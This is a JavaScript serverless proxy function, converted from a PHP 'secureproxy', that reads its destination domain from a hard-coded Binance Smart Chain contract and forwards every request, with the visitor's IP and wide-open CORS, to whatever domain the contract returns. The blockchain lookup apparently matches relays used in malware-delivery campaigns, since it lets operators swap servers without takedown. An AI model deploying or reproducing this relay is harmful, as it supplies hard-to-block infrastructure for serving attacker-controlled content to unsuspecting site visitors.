// Converted from secureproxy.php to Vercel serverless function
// Usage: /api/secureproxy?e=<endpoint-path>
// Behavior: Proxies requests to a target domain resolved from a BSC contract via JSON-RPC,
// with a short-lived cache. CORS enabled for all origins.

import fs from 'fs';
import path from 'path';

const UPDATE_INTERVAL_SEC = 60;
const CACHE_PATH = process.env.SECUREPROXY_CACHE_PATH || '/tmp/secureproxy_cache.json';
const DEFAULT_RPC_URLS = [
  "https://binance.llamarpc.com",
  "https://bsc.drpc.org"
];
const DEFAULT_CONTRACT = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
const METHOD_SELECTOR = "0x20965255"; // function selector used in the original PHP

function getClientIP(req) {
  const cf = req.headers['cf-connecting-ip'];
  if (cf) return Array.isArray(cf) ? cf[0] : cf;
  const xff = req.headers['x-forwarded-for'];
  if (xff) return (Array.isArray(xff) ? xff[0] : xff).split(',')[0].trim();
  return req.socket?.remoteAddress || '';
}

function hexToString(hex) {
  // Expect a hex string like "0x..." encoding an ABI-encoded string
  if (!hex) return '';
  hex = hex.startsWith('0x') ? hex.slice(2) : hex;
  if (hex.length < 128) return '';
  // Skip first 32 bytes (offset)
  const lengthHex = hex.slice(64, 128);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.slice(128, 128 + length * 2);
  let out = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const code = parseInt(dataHex.slice(i, i + 2), 16);
    if (!isFinite(code) || code === 0) break;
    out += String.fromCharCode(code);
  }
  return out;
}

function loadCache() {
  try {
    const raw = fs.readFileSync(CACHE_PATH, 'utf8');
    const obj = JSON.parse(raw);
    if (obj && obj.domain && obj.timestamp) {
      const age = (Date.now() / 1000) - obj.timestamp;
      if (age < UPDATE_INTERVAL_SEC) return obj.domain;
    }
  } catch {}
  return null;
}

function saveCache(domain) {
  try {
    fs.writeFileSync(CACHE_PATH, JSON.stringify({ domain, timestamp: Math.floor(Date.now()/1000) }));
  } catch {}
}

async function fetchTargetDomain({ rpcUrls, contractAddress }) {
  const body = {
    jsonrpc: "2.0",
    id: 1,
    method: "eth_call",
    params: [{
      to: contractAddress,
      data: METHOD_SELECTOR
    }, "latest"]
  };
  for (const rpc of rpcUrls) {
    try {
      const resp = await fetch(rpc, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });
      const data = await resp.json();
      if (data && data.result && !data.error) {
        const domain = hexToString(data.result);
        if (domain) return domain;
      }
    } catch (e) {
      // try next rpc
    }
  }
  throw new Error("Could not fetch target domain");
}

async function getTargetDomain(opts) {
  const cached = loadCache();
  if (cached) return cached;
  const domain = await fetchTargetDomain(opts);
  saveCache(domain);
  return domain;
}

function filterHeaders(headers) {
  const blacklist = new Set(['host','content-length']);
  const out = {};
  for (const [k, v] of Object.entries(headers)) {
    const key = k.toLowerCase();
    if (!blacklist.has(key) && v !== undefined) out[key] = v;
  }
  return out;
}

function setCors(res, contentType) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', '*');
  res.setHeader('Access-Control-Allow-Headers', '*');
  res.setHeader('Access-Control-Max-Age', '3600');
  if (contentType) res.setHeader('Content-Type', contentType);
}

export default async function handler(req, res) {
  // CORS preflight
  if (req.method === 'OPTIONS') {
    setCors(res);
    res.status(204).end();
    return;
  }

  const rpcUrls = (process.env.SECUREPROXY_RPC_URLS?.split(',').map(s=>s.trim()).filter(Boolean)) || DEFAULT_RPC_URLS;
  const contractAddress = process.env.SECUREPROXY_CONTRACT || DEFAULT_CONTRACT;

  const endpointRaw = (req.query?.e ? (Array.isArray(req.query.e) ? req.query.e[0] : req.query.e) : '').toString();
  if (!endpointRaw) {
    setCors(res);
    res.status(400).send('Missing endpoint');
    return;
  }
  const endpoint = endpointRaw.replace(/^\/+/, ''); // ltrim /

  try {
    const domain = await getTargetDomain({ rpcUrls, contractAddress });
    const targetUrl = `https://${domain}/${endpoint}`;

    // Prepare outgoing request
    const method = req.method || 'GET';
    const headers = filterHeaders(req.headers);
    headers['x-forwarded-for'] = getClientIP(req);
    let body;
    if (!['GET', 'HEAD'].includes(method)) {
      body = req.body;
      // If body is an object, send JSON by default unless raw text was provided
      if (body && typeof body === 'object' && !(body instanceof Buffer)) {
        headers['content-type'] = headers['content-type'] || 'application/json';
        body = JSON.stringify(body);
      }
    }

    const forwardResp = await fetch(targetUrl, { method, headers, body });
    const respContentType = forwardResp.headers.get('content-type') || undefined;
    setCors(res, respContentType);
    res.status(forwardResp.status);

    const arrayBuf = await forwardResp.arrayBuffer();
    res.send(Buffer.from(arrayBuf));
  } catch (err) {
    setCors(res);
    res.status(500).send('error' + (err?.message ? `: ${err.message}` : ''));
  }
}
